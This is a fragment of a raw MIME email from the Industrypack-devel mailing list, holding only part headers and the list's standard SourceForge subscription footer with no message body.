Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


------=_NextPart_000_0012_2A5997AA.98DD3F7E
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

------=_NextPart_000_0012_2A5997AA.98DD3F7E--

